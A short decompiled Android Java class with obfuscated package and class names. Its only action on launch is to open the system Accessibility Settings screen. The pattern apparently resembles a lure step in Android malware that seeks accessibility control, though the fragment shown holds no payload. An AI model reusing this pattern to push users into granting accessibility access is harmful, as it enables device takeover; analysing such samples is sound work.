package wocwvy.czyxoxmbauu.slsa.ncec;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;

public class fymeshs extends Activity {
    /* access modifiers changed from: protected */
    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        try {
            startActivity(new Intent("android.settings.ACCESSIBILITY_SETTINGS"));
        } catch (Exception unused) {
            finish();
        }
    }
}
